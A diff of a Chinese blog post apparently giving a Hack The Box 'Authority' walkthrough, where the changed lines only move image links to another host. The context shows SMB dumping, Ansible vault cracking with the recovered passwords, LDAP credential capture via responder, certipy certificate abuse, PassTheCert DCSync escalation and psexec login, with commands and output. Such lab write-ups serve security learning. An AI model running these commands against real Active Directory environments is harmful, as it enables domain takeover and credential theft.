@@ -13,23 +13,23 @@
 <meta property="og:site_name" content="碎碎念">
 <meta property="og:description" content="端口扫描12345678910111213141516171819202122232425262728293031323334353637└─$ nmap -Pn -p- 10.10.11.222 --min-rate&#x3D;10000 -sVStarting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-16 23:48 EDTWarning: 10.10.11.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115037.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115211.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115426.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115719.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115853.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230818015424.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819010209.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819042204.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819051950.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819052027.png">
-<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819053431.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115037.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115211.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115426.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115719.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115853.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230818015424.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230819010209.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230819042204.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230819051950.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230819052027.png">
+<meta property="og:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230819053431.png">
 <meta property="article:published_time" content="2023-04-04T14:14:03.000Z">
-<meta property="article:modified_time" content="2024-04-24T08:42:06.432Z">
+<meta property="article:modified_time" content="2024-04-24T09:36:41.922Z">
 <meta property="article:author" content="oh3R">
 <meta property="article:tag" content="htb">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115037.png">
+<meta name="twitter:image" content="http://oh3r.vip/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115037.png">
     
     
       
@@ -178,19 +178,19 @@
 
 
 
-<p><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115037.png" alt="Pasted image 20230817115037"><br>发现存在 Ansible，一个配置管理工具，dump下文件</p>
+<p><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115037.png" alt="Pasted image 20230817115037"><br>发现存在 Ansible，一个配置管理工具，dump下文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">recurse on //递归</span><br><span class="line">prompt //自动确认</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure>
 
-<h1 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h1><p>发现存在VAULT hash<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115211.png" alt="Pasted image 20230817115211"><br>破解hash<br>结果</p>
+<h1 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h1><p>发现存在VAULT hash<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115211.png" alt="Pasted image 20230817115211"><br>破解hash<br>结果</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwm_admin_login: svc_pwm  </span><br><span class="line">pwm_admin_password: pWm_@dm!N_!23  </span><br><span class="line">ladap_admin_password: DevT3st@123</span><br></pre></td></tr></table></figure>
 
-<h1 id="8443端口"><a href="#8443端口" class="headerlink" title="8443端口"></a>8443端口</h1><p>8443端口为pwm应用，提示开启了configuration模式，可以不通过ldap认证，修改配置<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115426.png" alt="Pasted image 20230817115426"><br>用前面拿到的pwm密码，登录后，看到有ldap相关设置<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115719.png" alt="Pasted image 20230817115719"><br>其中密码用户为svc_ldap,密码不可见，前面有一个ldap连接地址，修改ldap连接地址为攻击机，攻击机使用responder监听，web界面中点击 test ldap profile 会发起ldap认证请求，攻击机中抓到了明文账号密码<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230817115853.png" alt="Pasted image 20230817115853"></p>
-<h1 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h1><p>evil-winrm连接后，获取交互式shell<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230818015424.png" alt="Pasted image 20230818015424"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h1 id="存在adcs环境"><a href="#存在adcs环境" class="headerlink" title="存在adcs环境"></a>存在adcs环境</h1><p><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819010209.png" alt="Pasted image 20230819010209"></p>
+<h1 id="8443端口"><a href="#8443端口" class="headerlink" title="8443端口"></a>8443端口</h1><p>8443端口为pwm应用，提示开启了configuration模式，可以不通过ldap认证，修改配置<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115426.png" alt="Pasted image 20230817115426"><br>用前面拿到的pwm密码，登录后，看到有ldap相关设置<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115719.png" alt="Pasted image 20230817115719"><br>其中密码用户为svc_ldap,密码不可见，前面有一个ldap连接地址，修改ldap连接地址为攻击机，攻击机使用responder监听，web界面中点击 test ldap profile 会发起ldap认证请求，攻击机中抓到了明文账号密码<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230817115853.png" alt="Pasted image 20230817115853"></p>
+<h1 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h1><p>evil-winrm连接后，获取交互式shell<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230818015424.png" alt="Pasted image 20230818015424"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h1 id="存在adcs环境"><a href="#存在adcs环境" class="headerlink" title="存在adcs环境"></a>存在adcs环境</h1><p><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230819010209.png" alt="Pasted image 20230819010209"></p>
 <p>查找可以利用的模版</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -target 10.10.11.222 -dc-ip 10.10.11.222 -u svc_ldap -p &#x27;lDaP_1n_th3_cle4r!&#x27;  -vulnerable -stdout </span><br></pre></td></tr></table></figure>
 
-<p>发现有可以利用的模版<br>AUTHORITY.HTB\Domain Computers组代表机器账号，普通用户可以创建<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819042204.png" alt="Pasted image 20230819042204"><br>创建机器账号</p>
+<p>发现有可以利用的模版<br>AUTHORITY.HTB\Domain Computers组代表机器账号，普通用户可以创建<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230819042204.png" alt="Pasted image 20230819042204"><br>创建机器账号</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -method &#x27;LDAPS&#x27; -computer-name &quot;pentest\$&quot; -computer-pass password -dc-ip 10.10.11.222 authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -debug</span><br></pre></td></tr></table></figure>
 <p>请求证书</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ certipy req -username &#x27;pentest$&#x27;@authority.htb -password password -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb                  </span><br><span class="line">Certipy v4.7.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 24</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@authority.htb&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>
@@ -200,13 +200,13 @@
 <p>为svc_ldap添加dcsync权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/PassTheCert/Python]</span><br><span class="line">└─$ python3 passthecert.py -action modify_user -crt ../../../user.crt -key ../../../user.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate                           </span><br><span class="line">Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Granted user &#x27;svc_ldap&#x27; DCSYNC rights!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>dcsync导出admin hash</p>
-<p>报错<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819051950.png" alt="Pasted image 20230819051950"></p>
+<p>报错<br><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230819051950.png" alt="Pasted image 20230819051950"></p>
 <p>尝试修改管理员密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 passthecert.py -action modify_user -crt ../../../user.crt -key ../../../user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass</span><br></pre></td></tr></table></figure>
-<p><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819052027.png" alt="Pasted image 20230819052027"></p>
+<p><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230819052027.png" alt="Pasted image 20230819052027"></p>
 <p>psexec连接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py authority.htb/administrator:O00R3bR7yNV8tguJN3Ptp2XXnsbNmuJO@10.10.11.222</span><br></pre></td></tr></table></figure>
-<p><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blogPasted%20image%2020230819053431.png" alt="Pasted image 20230819053431"></p>
+<p><img src="/2023/04/04/HTB-Authority/blogPasted%20image%2020230819053431.png" alt="Pasted image 20230819053431"></p>
 
   </div>
 </article>
